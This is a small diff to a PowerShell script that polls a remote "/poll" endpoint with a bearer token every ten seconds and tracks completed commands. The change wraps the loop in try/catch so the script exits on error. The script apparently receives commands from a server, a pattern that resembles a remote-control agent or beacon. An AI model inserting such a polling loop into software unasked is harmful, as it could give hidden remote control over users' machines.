@@ -71,7 +71,7 @@ $poll_headers.Add('Authorization',"Bearer $access_token")
 $complete_commands =@{}
 
 while ($true){
-
+try{
 $polling_resp = Invoke-RestMethod -Uri "$url/poll" -Method Get -Headers $poll_headers -ContentType 'application/json'
 $post_body = ConvertTo-HashtableFromPsCustomObject($polling_resp)
 
@@ -108,7 +108,11 @@ $post_body = ConvertTo-HashtableFromPsCustomObject($polling_resp)
   }
 
   sleep(10)
-
+}
+catch
+{
+exit
+}
   }
 
   #echo "while loop ended"
